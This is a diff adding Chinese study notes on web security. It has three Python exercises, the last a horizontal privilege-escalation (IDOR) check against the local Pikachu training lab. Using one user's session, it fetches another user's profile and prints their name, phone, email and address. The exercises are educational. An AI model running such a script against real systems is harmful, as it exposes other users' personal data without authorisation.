@@ -1,0 +1,54 @@
+## 一、核心目标
+1.  实现权限用户遍历判断，理解访问控制的基础逻辑
+2.  编写带参数的GET请求脚本，模拟越权漏洞访问
+3.  使用requests库完成水平越权漏洞的自动化检测
+
+---
+
+## 二、代码实现与逐行解析
+
+### 习题1 纯基础语法（权限用户遍历判断）
+```python
+# 系统已授权用户列表
+auth_user = ["admin", "user01", "user02", "user03"]
+# 待检测访问名单
+check_list = ["user01", "hack", "user03", "test"]
+
+# 遍历判断每个用户是否合法
+for name in check_list:
+    if name in auth_user:
+        print(f"{name} 合法，允许访问系统")
+    else:
+        print(f"{name} 非法，拒绝访问")
+
+### 习题2 requests基础发包（带参数GET请求）
+import requests
+url="http://127.0.0.1:9999/pikachu/vul/overpermission/op1/op1_mem.php"
+target_user="kobe"
+par={"username":target_user,"submit":"点击查看个人信息"}
+headers={"Cookie":"PHPSESSID=8g87qc7l3rn7c27v75lnraqne6"}
+res=requests.get(url,params=par,headers=headers)
+print(f"状态码:{res.status_code}")
+if res.status_code == 200:
+    print(f"正在查看用户{target_user}的资料:")
+else:
+    print("请求失败")
+
+### 习题3 网安实战脚本（水平越权检测）
+import requests
+url="http://127.0.0.1:9999/pikachu/vul/overpermission/op1/op1_mem.php"
+cookies={
+    "PHPSESSID":"d7rlm75hqrb3bbb0pddq05ks80"
+}
+para_self={"username":"lucy","submit":"点击查看个人信息"}
+resp1=requests.get(url,cookies=cookies,params=para_self)
+para_other={"username":"lili","submit":"点击查看个人信息"}
+resp2=requests.get(url,cookies=cookies,params=para_other)
+if "个人信息" in resp2.text:
+    print("存在越权漏洞")
+    print("-"*30)
+    for line in resp2.text.split("\n"):
+        if any(key in line for key in ["姓名","性别","手机","邮箱","地址"]):
+            print(line.strip())
+else:
+    print("权限校验正常,无越权漏洞")
